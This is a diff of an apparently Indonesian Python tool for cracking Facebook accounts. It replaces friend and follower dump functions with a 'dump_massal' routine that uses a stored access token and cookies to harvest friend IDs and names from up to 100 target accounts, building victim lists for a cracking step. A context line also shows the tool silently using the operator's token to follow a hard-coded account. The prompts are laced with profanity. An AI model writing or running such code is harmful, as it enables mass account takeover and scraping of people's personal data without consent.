@@ -116,61 +116,53 @@ def bot():
 		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
 	except:
 		pass
-# DUMP PUBLIK
-def publik(romz,headers=header):
-    try:
-        os.mkdir('dump')
-    except:pass
-    try:
-    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri "%(P,M,P,H,P))
-        idt = raw_input(' [*] Target id : %s'%(K))
-        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
-        nm = json.loads(gas.text)
-        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
-        bff = open(file, 'w')
-        r = requests.get('https://graph.facebook.com/%s?fields=name,friends.fields(id,name).limit(5000)&access_token=%s'%(idt,romz))
-        z = json.loads(r.text)
-        for a in z['friends']['data']:
-            id.append(a['id'] + '<=>' + a['name'])
-            bff.write(a['id'] + '<=>' + a['name'] + '\n')
-            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
-            sys.stdout.flush();jeda(0.0050)
-        bff.close()
-        print ('\n\n %s[%s√%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
-        print ('%s [%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
-        raw_input('\n%s [ %senter %s] '%(P,K,P))
-        menu()
-    except Exception as e:
-        exit('\n %s[!] gagal dump id'%(P))
-        
-# DUMP FOLLOWERS
-def followers(romz,headers=header):
-    try:
-        os.mkdir('dump')
-    except:pass
-    try:
-    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump followers sendiri "%(P,M,P,H,P))
-        idt = raw_input(' [*] Target id : %s'%(K))
-        batas = raw_input(' %s[*] Maximal id : %s'%(P,K))
-        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
-        nm = json.loads(gas.text)
-        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
-        bff = open(file, 'w')
-        r = requests.get('https://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(%s)&access_token=%s'%(idt,batas,romz))
-        z = json.loads(r.text)
-        for a in z['subscribers']['data']:
-            id.append(a['id'] + '<=>' + a['name'])
-            bff.write(a['id'] + '<=>' + a['name'] + '\n')
-            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
-            sys.stdout.flush();jeda(0.0050)
-        bff.close()
-        print ('\n\n %s[%s√%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
-        print (' %s[%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
-        raw_input('\n%s [ %senter %s] '%(P,K,P))
-        menu()
-    except Exception as e:
-        exit('\n %s[!] gagal dump id'%(P))
-        
+#-------------------[ CRACK-PUBLIK ]----------------#
+def dump_massal():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	try:
+		jum = int(input('>> Mau Berapa Target Njing ? : '))
+	except ValueError:
+		print('>> Masukkan Angka Anjing, Malah Huruff ')
+		exit()
+	if jum<1 or jum>100:
+		print('>> Gagal Dump Idz ')
+		exit()
+	ses=requests.Session()
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input('>> Masukkan Idz Yang Ke '+str(yz)+' : ')
+		uid.append(kl)
+	for userr in uid:
+		try:
+			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+			for mi in col['friends']['data']:
+				try:
+					iso = (mi['id']+'|'+mi['name'])
+					if iso in id:pass
+					else:id.append(iso)
+				except:continue
+		except (KeyError,IOError):
+			pass
+		except requests.exceptions.ConnectionError:
+			print('>> Sinyal Loh Kek Kontoll ')
+			exit()
+	try:
+		print('')
+		print(f'>> Total Idz Yang Terkumpul🔥{h}'+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f'{x}')
+		print('>> Sinyal Lo kek Kontol ')
+		back()
+	except (KeyError,IOError):
+		print(f'>>{k} Pertemanan Tidak Public {x}')
+		time.sleep(3)
+		back()
 # DUMP POSTINGAN 
 def postingan(romz,headers=header):
     try:
